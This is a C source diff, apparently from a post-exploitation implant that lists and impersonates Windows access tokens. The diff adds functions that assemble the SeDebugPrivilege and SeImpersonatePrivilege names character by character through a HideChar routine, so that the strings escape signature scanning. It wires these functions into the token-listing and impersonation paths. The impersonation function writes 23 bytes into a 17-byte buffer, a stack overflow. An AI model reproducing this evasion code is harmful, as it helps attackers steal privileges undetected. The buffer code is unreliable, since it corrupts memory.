@@ -237,6 +237,64 @@ BOOL TokenSetPrivilege(
     return TRUE;
 }
 
+BOOL TokenSetSeDebugPriv(
+    IN BOOL  Enable
+) {
+    CHAR PrivName[ 17 ] = { 0 };
+
+    PrivName[ 0  ] = HideChar('S');
+    PrivName[ 1  ] = HideChar('e');
+    PrivName[ 2  ] = HideChar('D');
+    PrivName[ 3  ] = HideChar('e');
+    PrivName[ 4  ] = HideChar('b');
+    PrivName[ 5  ] = HideChar('u');
+    PrivName[ 6  ] = HideChar('g');
+    PrivName[ 7  ] = HideChar('P');
+    PrivName[ 8  ] = HideChar('r');
+    PrivName[ 9  ] = HideChar('i');
+    PrivName[ 10 ] = HideChar('v');
+    PrivName[ 11 ] = HideChar('i');
+    PrivName[ 12 ] = HideChar('l');
+    PrivName[ 13 ] = HideChar('e');
+    PrivName[ 14 ] = HideChar('g');
+    PrivName[ 15 ] = HideChar('e');
+    PrivName[ 16 ] = HideChar(0);
+
+    return TokenSetPrivilege(PrivName, Enable);
+}
+
+BOOL TokenSetSeImpersonatePriv(
+    IN BOOL  Enable
+) {
+    CHAR PrivName[ 17 ] = { 0 };
+
+    PrivName[ 0  ] = HideChar('S');
+    PrivName[ 1  ] = HideChar('e');
+    PrivName[ 2  ] = HideChar('I');
+    PrivName[ 3  ] = HideChar('m');
+    PrivName[ 4  ] = HideChar('p');
+    PrivName[ 5  ] = HideChar('e');
+    PrivName[ 6  ] = HideChar('r');
+    PrivName[ 7  ] = HideChar('s');
+    PrivName[ 8  ] = HideChar('o');
+    PrivName[ 9  ] = HideChar('n');
+    PrivName[ 10 ] = HideChar('a');
+    PrivName[ 11 ] = HideChar('t');
+    PrivName[ 12 ] = HideChar('e');
+    PrivName[ 13 ] = HideChar('P');
+    PrivName[ 14 ] = HideChar('r');
+    PrivName[ 15 ] = HideChar('i');
+    PrivName[ 16 ] = HideChar('v');
+    PrivName[ 17 ] = HideChar('i');
+    PrivName[ 18 ] = HideChar('l');
+    PrivName[ 19 ] = HideChar('e');
+    PrivName[ 20 ] = HideChar('g');
+    PrivName[ 21 ] = HideChar('e');
+    PrivName[ 22 ] = HideChar(0);
+
+    return TokenSetPrivilege(PrivName, Enable);
+}
+
 /*!
  * Adds an token to the vault.
  *
@@ -1036,7 +1094,7 @@ BOOL ListTokens( PUSER_TOKEN_DATA* pTokens, PDWORD pNumTokens )
         SysNtClose( hOwnToken ); hOwnToken = NULL;
     }
 
-    TokenSetPrivilege( SE_DEBUG_NAME, TRUE );
+    TokenSetSeDebugPriv( TRUE );
 
     // get the index of the object type 'Token'
     if ( ! GetTypeIndexToken( &TokenTypeIndex ) )
@@ -1252,7 +1310,7 @@ BOOL ImpersonateTokenInStore(
         return TRUE;
     }
 
-    if ( ! TokenSetPrivilege( SE_DEBUG_NAME, TRUE ) ) {
+    if ( ! TokenSetSeDebugPriv( TRUE ) ) {
         PUTS( "Could not enable SE_DEBUG_NAME privilege." )
         goto Cleanup;
     }
